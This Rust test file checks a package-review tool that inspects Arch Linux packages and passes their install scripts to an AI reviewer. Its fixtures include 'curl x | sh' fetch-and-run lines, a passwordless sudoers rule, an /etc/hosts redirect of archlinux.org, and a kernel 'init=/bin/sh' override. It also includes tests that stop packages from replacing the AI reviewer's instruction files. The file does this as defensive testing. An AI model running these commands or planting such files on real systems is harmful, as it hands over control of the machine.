    assert!(error.contains("third-party repository"), "{error}");

    // A reviewer's name on a package that drops the reviewer.
    let sub = TempDir::new("payload-reviewer-name");
    let hollow = pack(sub.path(), "claude-code", "", None, &[]);
    let error = refused(&hollow, "claude-code", SourceClass::ThirdPartyRepo);
    assert!(
        error.contains("would replace Guardian's reviewer"),
        "{error}"
    );
    assert_eq!(refused(&hollow, "claude-code", SourceClass::Official), "");
    let rival = pack(
        sub.path(),
        "rival",
        "conflict = opencode\n",
        None,
        &[("usr/bin/rival", b"x\n")],
    );
    let error = refused(&rival, "rival", SourceClass::LocalPackage);
    assert!(
        error.contains("remove or stand in for Guardian's reviewer"),
        "{error}"
    );
}

#[test]
fn what_the_reviewer_reads_as_its_instructions_is_nobodys_to_ship() {
    for path in [
        "etc/opencode/opencode.json",
        "etc/claude-code/managed-settings.json",
        "etc/claude-code",
        "usr/AGENTS.md",
        "usr/CLAUDE.md",
        "usr/CONTEXT.md",
        "usr/opencode.json",
        "usr/opencode.jsonc",
        "usr/.opencode/agent/review.md",
        "usr/.claude/settings.json",
        "AGENTS.md",
        "CLAUDE.md",
        "opencode.json",
    ] {
        for (package, class) in [
            ("evil", SourceClass::ThirdPartyRepo),
            ("opencode", SourceClass::Official),
            ("claude-code", SourceClass::Official),
            ("omarchy-guardian", SourceClass::LocalPackage),
        ] {
            assert!(
                protected_violation(path, package, class, &["evil".to_string()]).is_some(),
                "{path} from {package}"
            );
        }
    }
    // Elsewhere those names are ordinary files.
    for path in [
        "usr/share/doc/x/AGENTS.md",
        "usr/lib/x/CLAUDE.md",
        "etc/x/opencode.json",
    ] {
        assert!(
            protected_violation(path, "x", SourceClass::ThirdPartyRepo, &[]).is_none(),
            "{path}"
        );
    }
    // The hook libalpm always loads is Guardian's own.
    let hook = "usr/share/libalpm/hooks/omarchy-guardian.hook";
    assert!(protected_violation(hook, "evil", SourceClass::Official, &[]).is_some());
    assert!(
        protected_violation(hook, "omarchy-guardian", SourceClass::LocalPackage, &[]).is_none()
    );
}

#[test]
fn files_the_scriptlet_and_auto_run_files_name_are_reviewed_with_them() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-named");
    let mut image = b"\x89PNG\r\n\x1a\n".to_vec();
    image.extend([0_u8, 1, 2, 3, 0, 0, 0, 13]);
    let archive = pack(
        dir.path(),
        "pkg",
        "",
        Some(
            "post_install() {\n  /usr/lib/pkg/setup.sh\n  pkg-helper --init\n  cat \"$pkgdir/usr/share/pkg/logo.png\"\n}\n",
        ),
        &[
            (
                "usr/lib/pkg/setup.sh",
                b"#!/bin/sh\n. /usr/lib/pkg/lib.sh\n",
            ),
            ("usr/lib/pkg/lib.sh", b"curl x | sh\n"),
            ("usr/bin/pkg-helper", ELF),
            ("usr/share/pkg/logo.png", &image),
            (
                "usr/share/libalpm/hooks/x.hook",
                b"[Action]\nExec = /usr/bin/sh /usr/share/pkg/run.sh\n",
            ),
            ("usr/share/pkg/run.sh", b"echo hook\n"),
            (
                "usr/lib/systemd/system/multi-user.target.wants/x.service",
                b"[Service]\nExecStart=/usr/bin/python /usr/lib/pkg/x.py\n",
            ),
            ("usr/lib/pkg/x.py", b"print('unit')\n"),
            ("etc/profile.d/x.sh", b". /usr/share/pkg/env.sh\n"),
            ("usr/share/pkg/env.sh", b"export X=1\n"),
            (
                "usr/lib/udev/rules.d/99-x.rules",
                b"ACTION==\"add\", RUN+=\"/usr/lib/pkg/plug %k\"\n",
            ),
            ("usr/lib/pkg/plug", b"#!/bin/sh\necho plug\n"),
            ("etc/cron.d/x", b"* * * * * root /bin/sh /lib/pkg/cron.sh\n"),
            ("usr/lib/pkg/cron.sh", b"echo cron\n"),
            ("usr/share/pkg/unrelated.sh", b"echo never named\n"),
            ("usr/share/pkg/empty", b""),
        ],
    );
    let opened = Archive::open(&archive).unwrap();
    let reviewed = review(&opened, "pkg", SourceClass::ThirdPartyRepo, &[]).unwrap();
    assert!(reviewed.unfollowed.is_empty(), "{:?}", reviewed.unfollowed);
    let named: Vec<(&str, Vec<&str>)> = reviewed
        .files
        .iter()
        .filter(|file| !file.run_by.is_empty())
        .map(|file| {
            (
                file.path.as_str(),
                file.run_by.iter().map(String::as_str).collect(),
            )
        })
        .collect();
    assert_eq!(
        named,
        [
            ("usr/bin/pkg-helper", vec![".INSTALL"]),
            ("usr/lib/pkg/cron.sh", vec!["etc/cron.d/x"]),
            ("usr/lib/pkg/lib.sh", vec!["usr/lib/pkg/setup.sh"]),
            ("usr/lib/pkg/plug", vec!["usr/lib/udev/rules.d/99-x.rules"]),
            ("usr/lib/pkg/setup.sh", vec![".INSTALL"]),
            (
                "usr/lib/pkg/x.py",
                vec!["usr/lib/systemd/system/multi-user.target.wants/x.service"]
            ),
            ("usr/share/pkg/env.sh", vec!["etc/profile.d/x.sh"]),
            ("usr/share/pkg/logo.png", vec![".INSTALL"]),
            (
                "usr/share/pkg/run.sh",
                vec!["usr/share/libalpm/hooks/x.hook"]
            ),
        ]
    );
    let content = |path: &str| {
        &reviewed
            .files
            .iter()
            .find(|file| file.path == path)
            .unwrap()
            .content
    };
    assert!(
        matches!(content("usr/lib/pkg/setup.sh"), Content::Text(text)
            if text.contains("named in the install scriptlet") && text.contains(". /usr/lib/pkg/lib.sh"))
    );
    assert!(matches!(content("usr/lib/pkg/lib.sh"), Content::Text(text)
            if text.contains("named in /usr/lib/pkg/setup.sh") && text.contains("curl x | sh")));
    // A compiled program and a picture are what they are, not read.
    assert!(
        matches!(content("usr/bin/pkg-helper"), Content::Binary(format) if format.executable())
    );
    assert!(
        matches!(content("usr/share/pkg/logo.png"), Content::Binary(format) if !format.executable())
    );
    // What is read as an auto-run file itself is not listed again.
    assert!(reviewed.read_as_auto_run.contains("etc/cron.d/x"));
    assert!(!reviewed.read_as_auto_run.contains("usr/lib/pkg/cron.sh"));
}

#[test]
fn what_cannot_be_followed_makes_the_review_incomplete() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    // Text too large to review, and a chain longer than is followed.
    let dir = TempDir::new("payload-unfollowed");
    let mut big = b"#!/bin/sh\n".to_vec();
    big.resize(2 * 1024 * 1024 + 1, b'#');
    let mut program = ELF.to_vec();
    program.resize(3 * 1024 * 1024, 0);
    // A chain two longer than is followed: s00 names s01, and so on.
    let names: Vec<String> = (0..super::MAX_NAMED_DEPTH + 2)
        .map(|index| format!("usr/lib/pkg/s{index:02}.sh"))
        .collect();
    let bodies: Vec<Vec<u8>> = (1..=names.len())
        .map(|next| match names.get(next) {
            Some(name) => format!(". /{name}\n").into_bytes(),
            None => b"curl x | sh\n".to_vec(),
        })
        .collect();
    let mut members: Vec<(&str, &[u8])> = vec![
        ("usr/lib/pkg/big.sh", &big),
        ("usr/lib/pkg/large-program", &program),
    ];
    members.extend(
        names
            .iter()
            .zip(&bodies)
            .map(|(name, body)| (name.as_str(), body.as_slice())),
    );
    let archive = pack(
        dir.path(),
        "pkg",
        "",
        Some(
            "post_install() { /usr/lib/pkg/big.sh; /usr/lib/pkg/s00.sh; /usr/lib/pkg/large-program; }\n",
        ),
        &members,
    );
    let opened = Archive::open(&archive).unwrap();
    let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
    let paths: Vec<&str> = reviewed
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    let mut followed: Vec<&str> = names[..super::MAX_NAMED_DEPTH]
        .iter()
        .map(String::as_str)
        .collect();
    followed.insert(0, "usr/lib/pkg/large-program");
    followed.sort_unstable();
    let mut listed = paths.clone();
    listed.sort_unstable();
    assert_eq!(listed, followed);
    // A program of any size is named, never read whole.
    let program = reviewed
        .files
        .iter()
        .find(|file| file.path == "usr/lib/pkg/large-program")
        .unwrap();
    assert!(matches!(program.content, Content::Binary(_)));
    assert_eq!(reviewed.unfollowed.len(), 2, "{:?}", reviewed.unfollowed);
    assert!(
        reviewed.unfollowed[0].contains("/usr/lib/pkg/big.sh")
            && reviewed.unfollowed[0].contains("over the 2 MiB review limit"),
        "{:?}",
        reviewed.unfollowed
    );
    assert!(
        reviewed.unfollowed[1].contains(&format!("/{}", names[super::MAX_NAMED_DEPTH]))
            && reviewed.unfollowed[1].contains("were not followed"),
        "{:?}",
        reviewed.unfollowed
    );
}

#[test]
fn the_first_bytes_of_files_are_read_in_one_pass() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-heads");
    let mut long = vec![b'a'; 20_000];
    long[..4].copy_from_slice(b"head");
    let archive = pack(
        dir.path(),
        "pkg",
        "",
        None,
        &[
            ("usr/share/pkg/one", b"first\n"),
            ("usr/share/pkg/long", &long),
            ("usr/share/pkg/[odd]*name", b"odd\n"),
            ("usr/share/pkg/skipped", b"not asked for\n"),
        ],
    );
    let opened = Archive::open(&archive).unwrap();
    let asked = [
        "usr/share/pkg/[odd]*name".to_string(),
        "usr/share/pkg/long".to_string(),
        "usr/share/pkg/one".to_string(),
    ];
    let heads = opened.heads(&asked).unwrap();
    assert_eq!(heads.len(), 3);
    assert_eq!(heads["usr/share/pkg/one"], b"first\n");
    assert_eq!(heads["usr/share/pkg/[odd]*name"], b"odd\n");
    assert_eq!(
        heads["usr/share/pkg/long"].len(),
        crate::content::PROBE_SIZE
    );
    assert!(heads["usr/share/pkg/long"].starts_with(b"head"));
    assert!(opened.heads(&[]).unwrap().is_empty());
}

#[test]
fn completions_are_reviewed_for_other_than_official_packages_and_misplaced_files_named() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-unofficial");
    let archive = pack(
        dir.path(),
        "pkg",
        "",
        None,
        &[
            (
                "usr/share/bash-completion/completions/pkg",
                b"complete -F _pkg pkg\n",
            ),
            ("usr/share/zsh/site-functions/_pkg", b"#compdef pkg\n"),
            (
                "usr/share/vim/vimfiles/plugin/pkg.vim",
                b"autocmd VimEnter * echo 1\n",
            ),
            (
                "usr/local/lib/systemd/system/sshd.service",
                b"[Service]\nExecStart=/usr/bin/x\n",
            ),
            (
                "usr/share/systemd/user/pipewire.service",
                b"[Service]\nExecStart=/usr/bin/y\n",
            ),
            ("etc/skel/.bashrc", b"alias ls=ls\n"),
            ("etc/skel/.config/app/data.json", b"{}\n"),
            ("usr/lib/security/pam_pkg.so", ELF),
            ("usr/lib/glibc-hwcaps/x86-64-v3/libc.so.6", ELF),
            ("etc/kernel/cmdline", b"quiet init=/bin/sh\n"),
            ("etc/hosts", b"203.0.113.7 archlinux.org\n"),
            ("var/lib/flatpak/overrides/global", b"[Context]\n"),
            (
                "etc/ca-certificates/trust-source/anchors/x.crt",
                b"-----BEGIN CERTIFICATE-----\n",
            ),
            ("etc/tmux.conf", b"run-shell /usr/bin/x\n"),
        ],
    );
    let opened = Archive::open(&archive).unwrap();
    let paths = |class| {
        let reviewed = review(&opened, "pkg", class, &[]).unwrap();
        let paths: Vec<String> = reviewed.files.into_iter().map(|file| file.path).collect();
        (paths, reviewed.misplaced)
    };
    let (third, misplaced) = paths(SourceClass::ThirdPartyRepo);
    assert_eq!(
        third,
        [
            // Reviewed, so not also called unreviewed below.
            "etc/ca-certificates/trust-source/anchors/x.crt",
            "etc/skel/.bashrc",
            "etc/tmux.conf",
            "usr/local/lib/systemd/system/sshd.service",
            "usr/share/bash-completion/completions/pkg",
            "usr/share/systemd/user/pipewire.service",
            "usr/share/vim/vimfiles/plugin/pkg.vim",
            "usr/share/zsh/site-functions/_pkg",
        ]
    );
    let misplaced: Vec<(&str, &str)> = misplaced
        .iter()
        .map(|(path, when)| (path.as_str(), *when))
        .collect();
    assert_eq!(
        misplaced,
        [
            // By path, whatever order the archive lists them in.
            (
                "etc/hosts",
                "decides which address a name leads to, without asking DNS"
            ),
            ("etc/kernel/cmdline", "runs before the system starts"),
            (
                "usr/lib/glibc-hwcaps/x86-64-v3/libc.so.6",
                "applies to every program started"
            ),
            ("usr/lib/security/pam_pkg.so", "runs when someone logs in"),
            (
                "var/lib/flatpak/overrides/global",
                "decides what every Flatpak app may reach outside its sandbox"
            ),
        ]
    );

    let (official, misplaced) = paths(SourceClass::Official);
    assert_eq!(
        official,
        [
            "etc/ca-certificates/trust-source/anchors/x.crt",
            "etc/skel/.bashrc",
            "etc/tmux.conf",
            "usr/local/lib/systemd/system/sshd.service",
            "usr/share/systemd/user/pipewire.service",
            "usr/share/vim/vimfiles/plugin/pkg.vim",
        ]
    );
    assert!(misplaced.is_empty());
}

#[test]
fn an_archive_rewritten_in_place_no_longer_matches_its_fingerprint() {
    use std::io::{Seek, SeekFrom, Write};
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-fingerprint");
    let archive = pack(dir.path(), "pkg", "", None, &[("usr/bin/pkg", b"one\n")]);
    let opened = Archive::open(&archive).unwrap();
    let fingerprint = opened.fingerprint().unwrap();
    assert_eq!(
        *fingerprint.digest(),
        crate::sha256::Sha256::digest(&fs::read(&archive).unwrap())
    );
    assert!(fingerprint.rehash);
    assert_eq!(fingerprint.name(), "pkg-1-1-any");
    fingerprint.verify().unwrap();
    // Only a file nobody but root can touch is not hashed a second time.
    assert!(!super::root_alone(
        &archive,
        &fs::metadata(&archive).unwrap()
    ));
    let system = Path::new("/usr/bin/bsdtar");
    let metadata = fs::metadata(system).unwrap();
    if std::os::unix::fs::MetadataExt::uid(&metadata) == 0 {
        assert!(super::root_alone(system, &metadata));
        assert!(!super::root_alone(Path::new("usr/bin/bsdtar"), &metadata));
    }

    // The same file, the same bytes, but not what was hashed.
    let forged = super::Fingerprint {
        digest: crate::sha256::Sha256::digest(b"something else"),
        ..fingerprint.clone()
    };
    assert!(forged.verify().is_err());

    // Rewritten in place: same inode, same size, other bytes.
    let before = fs::metadata(&archive).unwrap();
    let mut file = fs::OpenOptions::new().write(true).open(&archive).unwrap();
    file.seek(SeekFrom::Start(600)).unwrap();
    file.write_all(b"two\n").unwrap();
    file.sync_all().unwrap();
    file.set_modified(before.modified().unwrap()).unwrap();
    drop(file);
    let after = fs::metadata(&archive).unwrap();
    assert_eq!(before.len(), after.len());
    assert_eq!(before.modified().unwrap(), after.modified().unwrap());
    let error = fingerprint.verify().unwrap_err().to_string();
    assert!(
        error.contains("changed while it was being reviewed"),
        "{error}"
    );
    // The kernel's change time alone gives it away, hash aside.
    assert!(opened.verify_unchanged().is_err());

    // A file swapped in under the same name is another file.
    let other = TempDir::new("payload-fingerprint-swap");
    let archive = pack(other.path(), "pkg", "", None, &[("usr/bin/pkg", b"one\n")]);
    let fingerprint = Archive::open(&archive).unwrap().fingerprint().unwrap();
    let copy = other.path().join("copy");
    fs::copy(&archive, &copy).unwrap();
    fs::rename(&copy, &archive).unwrap();
    assert!(fingerprint.verify().is_err());
}

#[test]
fn what_a_package_puts_where_a_link_leads() {
    use super::Replacement;
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-replacement");
    let mut program = ELF.to_vec();
    program.resize(3 * 1024 * 1024, 0);
    let mut text = b"ALL ALL=(ALL) ALL\n".to_vec();
    text.resize(2 * 1024 * 1024 + 1, b'#');
    let archive = pack(
        dir.path(),
        "pkg",
        "",
        None,
        &[
            ("usr/share/pkg/rule", b"ALL ALL=(ALL) NOPASSWD: ALL\n"),
            ("usr/share/pkg/program", &program),
            ("usr/share/pkg/long-rule", &text),
        ],
    );
    let opened = Archive::open(&archive).unwrap();
    assert_eq!(
        opened.replacement("usr/share/pkg/rule"),
        Some(Replacement::File(b"ALL ALL=(ALL) NOPASSWD: ALL\n".to_vec()))
    );
    assert_eq!(
        opened.replacement("usr/share/pkg/program"),
        Some(Replacement::Binary("ELF executable"))
    );
    assert_eq!(
        opened.replacement("usr/share/pkg/long-rule"),
        Some(Replacement::TooLarge)
    );
    assert_eq!(opened.replacement("usr/share/pkg"), None);
    assert_eq!(opened.replacement("usr/share/other/rule"), None);
    assert_eq!(super::through_root_links("sbin/x"), "usr/bin/x");
    assert_eq!(super::through_root_links("usr/lib64/x/y"), "usr/lib/x/y");
    assert_eq!(super::through_root_links("usr/share/x"), "usr/share/x");
}

#[test]
fn no_sweep_only_place_is_said_to_be_what_it_is_not() {
    // No Flatpak override is an app launcher, and a table the system
    // is set up by (or a quadlet) is not a program that runs.
    for location in crate::autorun::SYSTEM_SWEEP {
        let effect = super::sweep_only_effect(location);
        assert!(!effect.contains("open the app"), "{}", location.path);
        let table = matches!(
            location.path,
            "etc/fstab" | "etc/crypttab" | "etc/hosts" | "etc/containers/systemd/"
        );
        assert!(
            !table || !effect.starts_with("runs"),
            "{}: {effect}",
            location.path
        );
    }
}

#[test]
fn a_named_path_is_followed_as_the_system_walks_it() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-walked");
    let root = dir.path().join("pkg-root");
    for directory in ["usr/share/pkg", "usr/lib/pkg", "opt/pkg/releases/1"] {
        fs::create_dir_all(root.join(directory)).unwrap();
    }
    fs::write(root.join(".PKGINFO"), "pkgname = pkg\n").unwrap();
    fs::write(
        root.join(".INSTALL"),
        "post_install() {\n  sh /usr/lib/../share/pkg/dots.sh\n  sh /lib/../share/pkg//slashes.sh\n  /opt/pkg/current/run.sh\n  /opt/pkg/again/run2.sh\n  sh $dir/var.sh /usr/lib/pkg/../../../../etc/above.sh\n}\n",
    )
    .unwrap();
    for file in ["dots.sh", "slashes.sh", "var.sh", "above.sh"] {
        fs::write(root.join("usr/share/pkg").join(file), "echo x\n").unwrap();
    }
    fs::write(root.join("opt/pkg/releases/1/run.sh"), "echo run\n").unwrap();
    fs::write(root.join("opt/pkg/releases/1/run2.sh"), "echo run\n").unwrap();
    // A directory link the package ships, and one that leads to it.
    symlink("releases/1", root.join("opt/pkg/current")).unwrap();
    symlink("/opt/pkg/current", root.join("opt/pkg/again")).unwrap();
    // Links in a circle lead nowhere, and end.
    symlink("b", root.join("opt/pkg/a")).unwrap();
    symlink("a", root.join("opt/pkg/b")).unwrap();
    let archive = dir.path().join("pkg-1-1-any.pkg.tar");
    build(
        &root,
        &archive,
        &[".PKGINFO", ".INSTALL", "usr", "opt"],
        &["--uid", "0", "--gid", "0"],
    );
    let opened = Archive::open(&archive).unwrap();
    assert_eq!(
        opened.walked("usr/lib/../share/x").as_deref(),
        Some("usr/share/x")
    );
    // `/lib` is `usr/lib`, so the step back from it ends in `/usr`.
    assert_eq!(
        opened.walked("lib/../share/x").as_deref(),
        Some("usr/share/x")
    );
    assert_eq!(
        opened.walked("opt/pkg/again/x").as_deref(),
        Some("opt/pkg/releases/1/x")
    );
    assert_eq!(opened.walked("usr/../../etc/x"), None);
    assert_eq!(opened.walked("opt/pkg/a/x"), None);

    let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
    let named: Vec<&str> = reviewed
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    // A path behind a variable and one above the root are not found.
    assert_eq!(
        named,
        [
            "opt/pkg/releases/1/run.sh",
            "opt/pkg/releases/1/run2.sh",
            "usr/share/pkg/dots.sh",
            "usr/share/pkg/slashes.sh",
        ]
    );
}

#[test]
fn what_is_over_a_limit_is_left_unread_and_a_refusal_still_refuses() {
    if !tool_available("/usr/bin/bsdtar") {
        return;
    }
    let dir = TempDir::new("payload-unread");
    let mut big = b"#!/bin/sh\n".to_vec();
    big.resize(2 * 1024 * 1024 + 1, b'#');
    let script = String::from_utf8(big.clone()).unwrap();
    let files: &[(&str, &[u8])] = &[
        ("etc/profile.d/big.sh", &big),
        ("etc/profile.d/small.sh", b"export X=1\n"),
    ];
    let archive = pack(dir.path(), "pkg", "", Some(&script), files);
    let opened = Archive::open(&archive).unwrap();
    let reviewed = review(&opened, "pkg", SourceClass::LocalPackage, &[]).unwrap();
    assert!(reviewed.install.is_none());
    let read: Vec<&str> = reviewed
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    assert_eq!(read, ["etc/profile.d/small.sh"]);
    assert_eq!(
        reviewed.unfollowed,
        [
            "the install scriptlet exceeds the 2 MiB review limit",
            "auto-run file /etc/profile.d/big.sh exceeds the 2 MiB review limit"
        ]
    );

    // The same package claiming Guardian's place is refused all the
    // same: what is unread does not come before what is refused.
    let claiming = TempDir::new("payload-unread-claim");
    let archive = pack(
        claiming.path(),
        "pkg",
        "replaces = omarchy-guardian\n",
        Some(&script),
        files,
    );
    let opened = Archive::open(&archive).unwrap();
    assert!(review(&opened, "pkg", SourceClass::LocalPackage, &[]).is_err());
}
